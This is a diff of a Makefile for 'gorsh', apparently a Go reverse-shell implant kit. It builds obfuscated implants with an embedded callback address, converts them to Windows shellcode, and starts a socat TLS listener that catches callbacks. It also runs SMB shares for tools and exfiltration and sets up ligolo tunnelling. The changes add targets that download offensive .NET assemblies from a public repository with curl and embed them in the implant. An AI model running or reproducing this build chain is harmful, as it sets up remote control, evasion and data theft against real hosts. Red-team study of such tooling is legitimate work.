@@ -1,5 +1,5 @@
 ##############
-# CONFIGURATION
+#  CONFIGS
 ##############
 # used for artifact naming
 APP ?= gorsh
@@ -17,10 +17,13 @@ LPORT ?= 8443
 TOOLS ?= /srv/smb/tools
 EXFIL ?= /srv/smb/exfil
 
+ASSEMBLY_PATH = pkg/execute_assembly/embed
+assembly_repo = https://api.github.com/repos/flangvik/sharpcollection/contents/
+target_vers = 4.5
 
 ##############
-# ADVANCED
-# CONFIGURATION
+#  ADVANCED
+#   CONFIG
 ##############
 # sets mingw for dll target when not windows
 ifneq ($(UNAME), Windows)
@@ -28,8 +31,19 @@ ifneq ($(UNAME), Windows)
 endif
 # embeds paramaters
 LDFLAGS = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
-# references the calling target withing each block
+# references the calling target within each block
 target = $(word 1, $@)
+
+
+##############
+# DEPENDENCY
+# MANAGEMENT
+##############
+LIGOLO = ${HOME}/.local/bin/ligolo
+GODONUT = ${GOPATH}/bin/go-donut
+GARBLE = ${GOPATH}/bin/garble
+SOCAT = $(shell which socat)
+FZF = ${GOPATH}/bin/fzf
 
 
 ##############
@@ -45,12 +59,11 @@ ${PLATFORMS}: $(SRV_KEY) $(GARBLE) ## one of: windows, linux, darwin
 		cmd/gorsh/main.go
 
 listen: $(SRV_KEY) $(SOCAT) ## starts the socat tls listener that catches callbacks
-	@test -n "$(PORT)" || (echo "PORT not defined"; exit 1)
+	@test -n "$(LPORT)" || (echo "LPORT not defined"; exit 1)
 	${SOCAT} -d \
 		OPENSSL-LISTEN:${LPORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
-		TCP:10.10.14.21:13338
-		# TCP:127.0.0.1:1234
-		# EXEC:scripts/${target}.sh
+		EXEC:scripts/${target}.sh
+		# TCP:10.10.14.21:13338
 
 shellcode: $(GODONUT) windows ## generate PIC windows shellcode
 	${GODONUT} --arch x64 --verbose \
@@ -79,9 +92,14 @@ start-ligolo:  ## configures the necessary tun interfaces and starts ligolo. req
 # CIFS MGMNT
 ##############
 export DOCKERSMB SMBCONF
-start-smb: ## starts docker-smb containers that are needed by the upload/download commands. requires root
-	@echo "$$DOCKERSMB" > docker-compose.yml
-	@echo "$$SMBCONF" > .docker/data/config.yml
+.docker/data/config.yml:
+	@echo "$$SMBCONF" > $@
+
+export DOCKERSMB SMBCONF
+docker-compose.yml:
+	@echo "$$DOCKERSMB" > $@
+
+start-smb: docker-compose.yml .docker/data/config.yml ## starts docker-smb containers that are needed by the upload/download commands. requires root
 	docker-compose up -d --force-recreate
 
 stop-smb: ## stop the smb container
@@ -91,19 +109,36 @@ smblogs: ## monitor incoming smb connections
 	docker logs -f samba | grep 'connect\|numopen'
 
 
+##############
+# ASSEMBLY
+# EMBEDDING
+##############
+.assemblies.cache:
+	curl -o $(@F) -H "Accept: application/vnd.github.v3+json" \
+  ${assembly_repo}/NetFramework_${target_vers}_Any
+
+list-assemblies: .assemblies.cache ## list available assemblies to embed
+	env
+	jq -r '.[].name' < $< | tr [:upper:] [:lower:]
+
+choose-assemblies: $(FZF) ## choose assemblies to embed w/ fzf
+	@$(MAKE) -s list-assemblies | $(FZF) -m | while read asm; do \
+		$(MAKE) --no-print-directory ${ASSEMBLY_PATH}/$$asm.gz; \
+	done
+
+.ONESHELL:
+$(ASSEMBLY_PATH)/%.gz: .assemblies.cache
+	echo "[*] Preparing ${target}"
+	url=$$(jq -r '.[] | {name, download_url} | .name|=ascii_downcase | select(.name == "$*") | .download_url' < $<)
+	echo "[*] $${url} > ${target}"
+	curl -sL "$${url}" | gzip -> ${target}
+
 clean: ## reset the project
-	rm -rf ${OUT} certs/* docker-compose.yml .docker/data/*
+	rm -rf ${OUT} certs/* docker-compose.yml .docker/data/* .assemblies.cache
 
+superclean: clean ## also delete assemblies
+	rm pkg/execute_assembly/embed/*
 
-##############
-# DEPENDENCY
-# MANAGEMENT
-##############
-
-LIGOLO = ${GOPATH}/bin/ligolo
-GODONUT = ${GOPATH}/bin/go-donut
-GARBLE = ${GOPATH}/bin/garble
-SOCAT = $(shell which socat)
 
 # TLS cert targets
 SRV_KEY = certs/server.key
@@ -119,6 +154,9 @@ $(GODONUT):
 $(GARBLE):
 	go install mvdan.cc/garble@latest
 
+$(FZF):
+	go install github.com/junegunn/fzf@latest
+
 $(SOCAT):
 	sudo apt get install socat
 
@@ -126,7 +164,6 @@ $(SRV_KEY) $(SRV_PEM) &:
 	mkdir -p certs
 	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
 	@cat ${SRV_KEY} >> ${SRV_PEM}
-
 
 
 ##############
@@ -178,6 +215,6 @@ endef
 
 .DEFAULT_GOAL = help
 help:
-	@grep -h -E '^[\$a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}'
+	@grep -h -E '^[\$a-zA-Z\._-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}'
 
-.PHONY: help clean smblogs stop-smb start-smb start-ligolo dll shellcode listen shellcode $(PLATFORMS) all
+.PHONY: help clean smblogs stop-smb start-smb start-ligolo dll shellcode listen shellcode $(PLATFORMS) all ${ASSEMBLIES} list-assemblies choose-assemblies
